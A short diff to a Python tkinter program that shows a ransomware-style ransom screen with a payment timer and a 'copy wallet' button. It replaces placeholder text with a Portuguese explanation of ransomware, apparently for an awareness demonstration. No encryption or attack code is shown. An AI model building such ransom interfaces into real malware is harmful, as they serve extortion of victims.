@@ -153,7 +153,7 @@ def exibir_conscientizacao():
     tempo_pagamento.pack(anchor=tk.CENTER,pady=20)
 
     caixa_explicativa = tk.Text(janela, wrap="word", width=40, height=20, bg="black", fg="red", bd=0)
-    caixa_explicativa.insert(tk.END, """teste teste teste""")
+    caixa_explicativa.insert(tk.END, """O ransomware é uma ameaça digital cada vez mais presente em nosso mundo conectado. Trata-se de um tipo de malware que, quando executado em um computador, criptografa os arquivos do usuário, tornando-os inacessíveis. Os cibercriminosos por trás desse ataque, então, exigem um resgate em troca da chave de descriptografia, ameaçando a perda permanente de dados valiosos. Para garantir a segurança de suas informações, é fundamental que todos estejam cientes dos riscos associados ao ransomware e saibam como se proteger.""")
     caixa_explicativa.place(relx=0.05, rely=0.5, anchor="w")
 
     botao_copia = tk.Button(janela, bg="black",fg="red", text="Copiar Carteira", command=lambda:'39279fshdfskbAWEas342ssfe24afgDWkl2313jnsp$Mw')
